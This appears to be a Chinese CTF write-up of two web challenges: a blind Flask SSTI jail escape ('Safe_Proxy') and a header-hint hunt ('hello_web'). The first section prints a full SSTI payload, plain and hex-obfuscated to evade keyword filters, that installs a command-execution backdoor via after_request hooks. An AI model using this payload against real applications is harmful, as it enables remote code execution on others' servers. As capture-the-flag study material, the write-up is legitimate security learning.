
### Safe_Proxy

打开网页，得到本题的题目 Python 代码，经过代码审计得知本题是一个 flask 框架的无回显 SSTI 模板注入，同时需要 break jail。

- https://www.cnblogs.com/meraklbz/p/18572680 无回显 SSTI
- https://blog.csdn.net/qq_38154820/article/details/111399386 breakjail

```python
# 原 payload
url_for__globals__['__builtins__']['eval']("app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('cmd') and exec(\"global CmdResp;CmdResp=__import__(\'flask\').make_response(__import__(\'os\').popen(request.args.get(\'cmd\')).read())\")==None else resp)",{'request':url_for.__globals__['request'],'app':url_for.__globals__['sys'].modules['__main__'].__dict__['app']})

# 改写后的 payload
url_for['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x65\x76\x61\x6c']("app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('cmd') and exec(\"global CmdResp;CmdResp=\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f(\'flask\').make_response(getattr(\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f(\'\x6f\x73\'), \'\x70\x6f\x70\x65\x6e\')(request.args.get(\'cmd\')).read())\")==None else resp)",{'request':url_for['\x5f\x5fglobals\x5f\x5f']['request'],'app':url_for['\x5f\x5fglobals\x5f\x5f']['\x73\x79\x73'].modules['\x5f\x5fmain\x5f\x5f']['\x5f\x5fdict\x5f\x5f']['app']})
```

改写重点在于对于 `__` 和其他关键字的处理，其中 .popup 方法无法直接改写，因此改用 getattr 然后再改写 popup。

将改写后的 payload 包裹在 `{{}}` 中，作为 code 字段的参数 post 到该网址，便能 getshell，然后访问 `/?cmd=cat ../flag` 拿到 flag：`flag{9d95d67a-47df-4eb2-a230-e9f30f2adc66}`。

### hello_web

使用 BurpSuite 抓包，在访问指定网页时看到如下 response。

![](attachments/Pasted%20image%2020241215093135.png)

去 /bookmarks.html，内含 hackme.php、tips.php 两个提示，访问对应 php。

在访问对应 php 之后重定向的请求的请求头中可以看到字段：

```
tip: &#105;&#110;&#99;&#108;&#117;&#100;&#101;&#46;&#112;&#104;&#112
=
tip: include.php
```